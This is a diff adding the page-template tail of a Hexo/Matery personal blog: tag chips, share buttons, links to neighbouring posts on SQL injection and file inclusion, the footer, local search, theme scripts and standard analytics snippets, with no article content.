+                                <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+                                    <span class="chip bg-color">文件上传</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2023/07/23/sql-zhu-ru/">
+                    <div class="card-image">
+                        
+                        <img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/103.jpg" class="responsive-img" alt="sql注入">
+                        
+                        <span class="card-title">sql注入</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-07-23
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/sql%E6%B3%A8%E5%85%A5/" class="post-category">
+                                    sql注入
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E7%BD%91%E5%AE%89/">
+                        <span class="chip bg-color">网安</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E/">
+                        <span class="chip bg-color">漏洞</span>
+                    </a>
+                    
+                    <a href="/tags/sql%E6%B3%A8%E5%85%A5/">
+                        <span class="chip bg-color">sql注入</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/07/20/wen-jian-bao-han/">
+                    <div class="card-image">
+                        
+                        <img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/104.jpg" class="responsive-img" alt="文件包含">
+                        
+                        <span class="card-title">文件包含</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-20
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="post-category">
+                                    文件包含
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E7%BD%91%E5%AE%89/">
+                        <span class="chip bg-color">网安</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E/">
+                        <span class="chip bg-color">漏洞</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+                        <span class="chip bg-color">文件包含</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2023</span>
+            
+            <a href="/about" target="_blank">Serendipity</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">32.6k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+        
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+    <script type="text/javascript" color="0,0,255"
+        pointColor="0,0,255" opacity='0.7'
+        zIndex="-1" count="99"
+        src="/libs/background/canvas-nest.js"></script>
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
